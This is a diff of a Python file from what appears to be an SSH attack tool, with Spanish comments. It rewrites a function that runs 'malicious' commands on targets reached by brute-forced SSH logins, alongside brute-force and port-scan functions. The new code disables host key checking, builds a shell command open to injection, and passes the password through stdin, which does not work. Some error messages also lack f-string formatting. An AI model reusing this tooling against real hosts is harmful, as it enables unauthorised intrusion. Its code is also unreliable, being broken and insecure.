@@ -22,28 +22,34 @@ def brute_force_attack(target_ip, target_port, username_list, password_list):
 
 
 ### Execute command when inside ssh
-def execute_command(target_ip, target_port, username, password, command):
+def execute_ssh_command(target_ip, port, username, password, command):
+    # Construir el comando SSH con la información proporcionada
+    ssh_command = f'ssh -p {port} -o StrictHostKeyChecking=no {username}@{target_ip} "{command}"'
+
+    # Ejecutar el comando SSH
     try:
-        # Establecer conexión SSH
-        ssh_client = paramiko.SSHClient()
-        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh_client.connect(target_ip, port=target_port, username=username, password=password)
+        # Abrir una subproceso con el comando SSH
+        ssh_process = subprocess.Popen(ssh_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        # Proporcionar la contraseña a través de la entrada estándar
+        ssh_process.stdin.write(password)
+        
+        # Leer la salida y la salida de error del proceso SSH
+        output, error_output = ssh_process.communicate()
 
-        # Ejecutar comando malicioso
-        stdin, stdout, stderr = ssh_client.exec_command(command)
-
-        # Leer y mostrar la salida del comando
-        output = stdout.read().decode("utf-8")
-        print("Command executed:", command)
-        print("Output:", output)
-
-        # Cerrar la conexión SSH
-        ssh_client.close()
-    except paramiko.AuthenticationException:
-        print("{Fore.RED}[ERROR]{Fore.RESET} Authentication: Username or password incorrect") 
-    except paramiko.SSHException as e:
-        print(f"{Fore.RED}[ERROR]{Fore.RESET} SSH: {e}")
-
+        # Imprimir la salida del comando
+        if output:
+            print("{Fore.GREEN}[SUCCESS]{Fore.RESET} Output:")
+            print(output)
+        
+        # Imprimir la salida de error si la hay
+        if error_output:
+            print("{Fore.RED}[ERROR]:{Fore.RESET}")
+            print(error_output)
+    except subprocess.CalledProcessError as e:
+        print(f"{Fore.RED}[ERROR]{Fore.RESET} executing SSH command: {e}")
+    except Exception as e:
+        print(f"{Fore.RED}[ERROR]:{Fore.RESET} {e}")
 
 ### Scan open ports
 def port_scan(target_ip):
